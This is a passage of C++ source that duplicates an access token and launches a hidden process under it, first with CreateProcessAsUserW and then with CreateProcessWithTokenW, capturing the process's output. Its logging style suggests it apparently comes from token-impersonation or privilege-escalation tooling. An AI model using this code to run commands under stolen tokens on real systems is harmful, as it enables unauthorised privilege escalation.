        SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
        SetHandleInformation(hStdOutWrite, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
    }

    HANDLE hPrimaryToken = NULL;
    BOOL bDuplicated = DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken);
    if (!bDuplicated) {
        m_ConsoleWriter << std::dec << L"[!] DuplicateTokenEx failed: " << GetLastError() << std::endl;
        hPrimaryToken = hToken;
    }

    STARTUPINFOW si = {};
    PROCESS_INFORMATION pi = {};
    si.cb = sizeof(STARTUPINFOW);
    si.dwFlags = STARTF_USESTDHANDLES;

    if (pOutput) {
        si.hStdOutput = hStdOutWrite;
        si.hStdError = hStdOutWrite;
        si.hStdInput = NULL;
    }

    BOOL bResult = CreateProcessAsUserW(
        hPrimaryToken,
        NULL,
        (LPWSTR)lpCommandLine,
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!bResult) {
        DWORD dwErr1 = GetLastError();
        m_ConsoleWriter << std::dec << L"[*] CreateProcessAsUserW failed: " << dwErr1 << L", trying CreateProcessWithTokenW..." << std::endl;

        bResult = CreateProcessWithTokenW(
            hPrimaryToken,
            0,
            NULL,
            (LPWSTR)lpCommandLine,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi
        );

        if (!bResult) {
            DWORD dwErr2 = GetLastError();
            m_ConsoleWriter << std::dec << L"[!] CreateProcessWithTokenW also failed: " << dwErr2 << std::endl;
        }
    }

    if (bDuplicated && hPrimaryToken) {
        CloseHandle(hPrimaryToken);
    }

    if (pOutput) {
        CloseHandle(hStdOutWrite);

        if (bResult) {
            WaitForSingleObject(pi.hProcess, INFINITE);

            char buffer[4096];
            DWORD bytesRead;
            while (ReadFile(hStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                WCHAR wbuffer[4096];
                MultiByteToWideChar(CP_ACP, 0, buffer, -1, wbuffer, 4096);
                *pOutput += wbuffer;
            }
        }

        CloseHandle(hStdOutRead);
    }

    if (bResult) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    return bResult;
}

}
